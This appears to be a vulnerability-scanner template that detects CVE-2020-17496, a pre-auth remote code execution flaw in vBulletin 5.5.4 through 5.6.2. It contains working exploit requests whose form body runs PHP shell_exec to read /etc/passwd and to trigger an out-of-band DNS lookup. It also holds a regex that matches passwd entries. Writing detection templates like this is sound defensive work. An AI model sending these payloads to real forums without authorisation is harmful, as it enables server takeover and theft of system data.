send:
    - method: 'POST'
      url: '/ajax/render/widget_tabbedcontainer_tab_panel'
      headers:
        - CONTENT-TYPE: application/x-www-form-urlencoded
      body: 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec("cat /etc/passwd"); exit;'

    - method: 'POST'
      url: '/ajax/render/widget_tabbedcontainer_tab_panel'
      headers:
        - CONTENT-TYPE: application/x-www-form-urlencoded
      body: 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec("getent hosts DNS_MARKER"); exit;'

detect:
    - response:
      - body: '[a-z]*:[^:]*:[0-9]*:[0-9]*:[^:]*:\/[^:]*:\/[^:]*'
    - oob:
      - dns

meta-info:
    - type: rce
    - threat: 98
    - applicable_for:
      - scanner
    - title: "vBulletin 5.5.4 through 5.6.2 remote code execution (CVE-2020-17496)"
    - description: "vBulletin 5.5.4 through 5.6.2 allows remote code execution because of an incomplete patching of the previous CVE-2019-16759 RCE. This logic bug allows for a single pre-auth request to execute PHP code on a target vBulletin forum."
    - additional: "For more information, see https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch"
    - tags:
      - vBulletin
      - CVE-2020-17496
      - CVE-2019-16759
  